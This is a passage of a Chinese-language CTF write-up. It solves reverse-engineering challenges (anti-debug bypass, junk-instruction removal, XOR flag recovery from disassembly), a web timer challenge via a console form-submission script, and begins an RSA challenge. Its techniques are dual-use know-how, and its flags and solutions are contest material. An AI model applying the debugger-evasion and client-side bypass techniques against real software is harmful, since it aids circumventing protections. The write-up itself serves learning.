<span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_110], <span class="number">6Fh</span> <span class="comment">; &#x27;o&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CD1                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10F], <span class="number">6Dh</span> <span class="comment">; &#x27;m&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CD8                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10E], <span class="number">79h</span> <span class="comment">; &#x27;y&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CDF                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10D], <span class="number">32h</span> <span class="comment">; &#x27;2&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CE6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10C], <span class="number">2Eh</span> <span class="comment">; &#x27;.&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CED                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10B], <span class="number">6Ch</span> <span class="comment">; &#x27;l&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CF4                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10A], <span class="number">23h</span> <span class="comment">; &#x27;#&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CFB                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_109], <span class="number">7Bh</span> <span class="comment">; &#x27;&#123;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22D02                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_EC], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22D0C                 <span class="keyword">jmp</span>     short loc_7FF670C22D1C</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22D0E <span class="comment">; ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>进行异或，即条件判定已修改完成，绕过了反调试机制，接着进行动态调试，退出前发现key已经变为<font color=lime><strong>[0x05, 0x0D, 0x0F, 0x47, 0x02, 0x02, 0x0C, 0x7F, 0x22, 0x5A,  0x0C,0x11, 0x47, 0x0A, 0x56, 0x52, 0x3C, 0x0C, 0x0F, 0x59, 0x26, 0x5E, 0x06, 0x7F, 0x04, 0x08, 0x00, 0x0A, 0x45, 0x09, 0x5A, 0x42]</strong></font>，将flag与key进行异或，得到<font color=deepskyblue><strong>flag{my_D3bugg3r_may_1s_banned?}</strong></font>.代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  flag[i] ^= key[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure>

<h3 id="Dirty-flowers："><a href="#Dirty-flowers：" class="headerlink" title="Dirty flowers："></a>Dirty flowers：</h3><p>反编译后发现程序内有花指令混淆了某些基本函数，找到程序内部有以下提示：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>00B83118 Format <span class="built_in">db</span> <span class="string">&#x27;Please first master basic x86 assembly knowledge&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83150 aThisProgramWil <span class="built_in">db</span> <span class="string">&#x27;This program will teach you a relatively simple method to remove &#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83191 <span class="built_in">db</span> <span class="string">&#x27;flower commands&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B831A8 aIfYouCannotDis <span class="built_in">db</span> <span class="string">&#x27;If you cannot distinguish the flower instruction of this program,&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B831E9 <span class="built_in">db</span> <span class="string">&#x27; please focus mainly on the &#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27;call $ + 5&#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27; and &#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27;r&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83218 <span class="built_in">db</span> <span class="string">&#x27;etn&#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27; instructions&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83230 aIfYouStillDonT <span class="built_in">db</span> <span class="string">&#x27;If you still don&#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27;t understand how to remove it, you can cha&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B8326B <span class="built_in">db</span> <span class="string">&#x27;nge all the instructions in the 0x004012F1-0x00401302 section to &#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B832AC <span class="built_in">db</span> <span class="string">&#x27;nop instructions.Then press U and then P at the position of the f&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B832ED <span class="built_in">db</span> <span class="string">&#x27;unction head.&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B832FC aNowEnterTheFla <span class="built_in">db</span> <span class="string">&#x27;Now enter the flag you have obtained:&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>接下来就是检测flag，反编译main会发现main执行后会自动跳转到这里（用汇编语言继续执行？），根据提示将对应的函数全部改成nop（无操作），再进行断点调试运行，发现机制是先检测位数是否符合要求，如果不符合要求直接以错误的长度退出，长度符合要求再进行字符上的比较，在反汇编代码中找到检测输入部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B81321 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1004h</span>] <span class="comment">; （用户输入存储在 [ebp-1004h] 中）</span></span><br><span class="line"><span class="symbol">.text:</span>00B81327 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00B81328 <span class="keyword">push</span>    offset aS        <span class="comment">; &quot;%s&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>00B8132D <span class="keyword">call</span>    sub_B810C0</span><br><span class="line"><span class="symbol">.text:</span>00B81332 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>和比较长度部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B8138C <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1010h</span>], <span class="number">24h</span> <span class="comment">; &#x27;$&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00B81393 <span class="keyword">jz</span>      short loc_B813A6	     <span class="comment">; 长度符合要求直接跳转到00B813A6</span></span><br><span class="line"><span class="symbol">.text:</span>00B81395 <span class="keyword">push</span>    offset aWrongLength        <span class="comment">; &quot;wrong length!\n&quot;</span></span><br></pre></td></tr></table></figure>
<p>发现所需长度是0x24（也就是36位），再观察下方符合长度要求时进一步的检测：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B813A6 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00B813A6</span><br><span class="line"><span class="symbol">.text:</span>00B813A6 loc_B813A6:                             <span class="comment">; CODE XREF: .text:00B81393↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00B813A6                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1010h</span>] <span class="comment">; 输入长度（24h）存入ecx</span></span><br><span class="line"><span class="symbol">.text:</span>00B813AC                 <span class="keyword">push</span>    <span class="built_in">ecx</span>		  <span class="comment">; 将ecx压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813AD                 <span class="keyword">lea</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>-<span class="number">1004h</span>] <span class="comment">; flag每个字符的具体值存入edx</span></span><br><span class="line"><span class="symbol">.text:</span>00B813B3                 <span class="keyword">push</span>    <span class="built_in">edx</span>		  <span class="comment">; 将edx压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813B4                 <span class="keyword">call</span>    sub_B81100       <span class="comment">; 调用子函数 sub_B81100</span></span><br></pre></td></tr></table></figure>
<p>子函数sub_B81100反编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_B81100</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0[<span class="number">16</span>]; <span class="comment">// [esp+24h] [ebp-14h] BYREF //v0是一个长度为16 的字符数组，用于存储字符串</span></span><br><span class="line">  <span class="built_in">strcpy</span>(v0, <span class="string">&quot;dirty_flower&quot;</span>); <span class="comment">//使用strcpy将字符串&quot;dirty_flower&quot;复制到v0中</span></span><br><span class="line">  <span class="built_in">strlen</span>(v0);<span class="comment">//使用strlen计算v0中字符串的长度</span></span><br><span class="line">  JUMPOUT(<span class="number">0xB81177</span>); <span class="comment">//跳转到0xB81177</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0xB81177部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B81177</span><br><span class="line"><span class="symbol">.text:</span>00B81177 loc_B81177:                             <span class="comment">; DATA XREF: sub_B81100+6C↑o</span></span><br><span class="line"><span class="symbol">.text:</span>00B81177                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>], <span class="number">0</span> <span class="comment">;[ ebp-1Ch]改写为0</span></span><br><span class="line"><span class="symbol">.text:</span>00B8117E                 <span class="keyword">jmp</span>     short loc_B81189 <span class="comment">; 跳转到0xB81189</span></span><br></pre></td></tr></table></figure>
<p>0xB81189周围的循环：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B81180 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00B81180</span><br><span class="line"><span class="symbol">.text:</span>00B81180 loc_B81180:                             <span class="comment">; CODE XREF: .text:00B811B0↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00B81180                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B81183                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>00B81186                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>-<span class="number">1Ch</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>00B81189                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] 	<span class="comment">; 将0存入edx</span></span><br><span class="line"><span class="symbol">.text:</span>00B8118C                 <span class="keyword">cmp</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]	<span class="comment">; 比较edx和[ebp+0Ch]</span></span><br><span class="line"><span class="symbol">.text:</span>00B8118F                 <span class="keyword">jge</span>     short loc_B811B2	<span class="comment">; 如果edx≥[ebp+0Ch]就跳转到0xB811B2（代表全部加密完成）</span></span><br><span class="line"><span class="symbol">.text:</span>00B81191                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]	<span class="comment">; 将0存入edx</span></span><br><span class="line"><span class="symbol">.text:</span>00B81194                 <span class="keyword">cdq</span></span><br><span class="line"><span class="symbol">.text:</span>00B81195                 <span class="keyword">idiv</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">2Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B81198                 <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="built_in">edx</span>-<span class="number">14h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B8119D                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811A0                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811A3                 <span class="keyword">movsx</span>   <span class="built_in">edx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811A6                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span>		<span class="comment">; 经过动态调试，发现这一步左侧是每个输入的字符，右侧是定值串dirty_flower构成的循环</span></span><br><span class="line"><span class="symbol">.text:</span>00B811A8                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811AB                 <span class="keyword">add</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811AE                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span>00B811B0                 <span class="keyword">jmp</span>     short loc_B81180	<span class="comment">; 回到循环</span></span><br></pre></td></tr></table></figure>
<p>子函数sub_B81100结束后：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B813B9                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00B813BC                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1010h</span>] <span class="comment">; 输入长度存入eax</span></span><br><span class="line"><span class="symbol">.text:</span>00B813C2                 <span class="keyword">push</span>    <span class="built_in">eax</span>		   <span class="comment">; 将eax压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813C3                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1004h</span>] <span class="comment">; flag每个字符的具体值存入ecx中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813C9                 <span class="keyword">push</span>    <span class="built_in">ecx</span>		   <span class="comment">; 将ecx压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813CA                 <span class="keyword">call</span>    sub_B811D0       <span class="comment">; 调用子函数 sub_B811D0</span></span><br><span class="line"><span class="symbol">.text:</span>00B813CF                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00B813D2                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>         <span class="comment">; 检查sub_B811D0 的返回值是否为0</span></span><br><span class="line"><span class="symbol">.text:</span>00B813D4                 <span class="keyword">jz</span>      short loc_B813E5 <span class="comment">; 如果返回值为 0，跳转到 loc_B813E5（判输）</span></span><br><span class="line"><span class="symbol">.text:</span>00B813D6                 <span class="keyword">push</span>    offset aSuccess  <span class="comment">; &quot;success!\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>00B813DB                 <span class="keyword">call</span>    sub_B81050</span><br><span class="line"><span class="symbol">.text:</span>00B813E0                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00B813E3                 <span class="keyword">jmp</span>     short loc_B813F2</span><br><span class="line"><span class="symbol">.text:</span>00B813E5 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00B813E5</span><br><span class="line"><span class="symbol">.text:</span>00B813E5 loc_B813E5:                             <span class="comment">; CODE XREF: .text:00B813D4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00B813E5                 <span class="keyword">push</span>    offset aNo      <span class="comment">; &quot;no!\n&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在此基础上反编译sub_B811D0函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_B811D0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-4h]</span></span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">19</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">19</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">30</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">83</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">92</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">26</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">39</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">67</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">29</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">54</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">67</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">7</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">38</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">45</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">85</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">13</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">3</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">27</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">28</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">45</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">28</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">28</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">48</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">56</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">50</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">85</span>;</span><br><span class="line">  v3[<span class="number">31</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">32</span>] = <span class="number">27</span>;</span><br><span class="line">  v3[<span class="number">33</span>] = <span class="number">22</span>;</span><br><span class="line">  v3[<span class="number">34</span>] = <span class="number">84</span>;</span><br><span class="line">  v3[<span class="number">35</span>] = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v3[i] != *(<span class="type">char</span> *)(i + a1) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即输入与<font color=red><strong>dirty_flower</strong></font>循环异或后得到的结果与v3逐字符比对，若有不符的直接返回0，倒推得到flag：<font color=deepskyblue><strong>flag{A5s3mB1y_1s_r3ally_funDAm3nta1}</strong></font>.</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">83</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">54</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">85</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">50</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">27</span>, <span class="number">22</span>, <span class="number">84</span>, <span class="number">15</span>]</span><br><span class="line">dirty_flower = [<span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">flag_b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v3)):</span><br><span class="line">    flag_gen = v3[i] ^ dirty_flower[i % <span class="built_in">len</span>(dirty_flower)]</span><br><span class="line">    flag_b.append(flag_gen)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> flag_b)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Web方向：-1"><a href="#Web方向：-1" class="headerlink" title="Web方向："></a>Web方向：</h2><h3 id="你能在一秒内打出八句英文吗："><a href="#你能在一秒内打出八句英文吗：" class="headerlink" title="你能在一秒内打出八句英文吗："></a>你能在一秒内打出八句英文吗：</h3><p>进入页面，发现右键、开发者菜单、复制粘贴等全部被禁用，下方有一个计时器，超出一秒就无法成功，再观察源代码，发现源代码第41行就是要输入的文本内容，形如<code>&lt;p id=&quot;text&quot;&gt;xxx&lt;/p&gt;</code>，于是选择使用JavaScript在控制台提交：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> textElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sentences = textElement.<span class="property">textContent</span>;</span><br><span class="line"><span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">form.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span>;</span><br><span class="line">form.<span class="property">action</span> = <span class="string">&#x27;/submit&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line">input.<span class="property">type</span> = <span class="string">&#x27;hidden&#x27;</span>;</span><br><span class="line">input.<span class="property">name</span> = <span class="string">&#x27;user_input&#x27;</span>;</span><br><span class="line">input.<span class="property">value</span> = sentences;</span><br><span class="line">form.<span class="title function_">appendChild</span>(input);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(form);</span><br><span class="line">form.<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure>
<p>将代码提前复制粘贴到控制台，在按下按钮的瞬间迅速按enter即可在一秒内提交答案，得到flag：<font color=deepskyblue><strong>flag{70c3123f-1368-4b50-a6de-e10468333471}</strong></font>.</p>
<h2 id="Crypto方向：-1"><a href="#Crypto方向：-1" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="这是几次方？疑惑！："><a href="#这是几次方？疑惑！：" class="headerlink" title="这是几次方？疑惑！："></a>这是几次方？疑惑！：</h3><p>^在计算机中并不表示次方（Pow）而是表示异或（谐音疑惑），下载py文件后得到另一个RSA加密，其中有e &#x3D; 65537，hint &#x3D; p^e + 10086，而异或的优先级低于加号，所以由提示的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint=12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=hint^75623=12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531598921</span><br></pre></td></tr></table></figure>
<p>从而计算出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=9894080171409167477731048775117450997716595135307245061889351408996079284609420327696692120762586015707305237750670080746600707139163744385937564246995541</span><br></pre></td></tr></table></figure>
<p>用之前写的python工具得出</p>
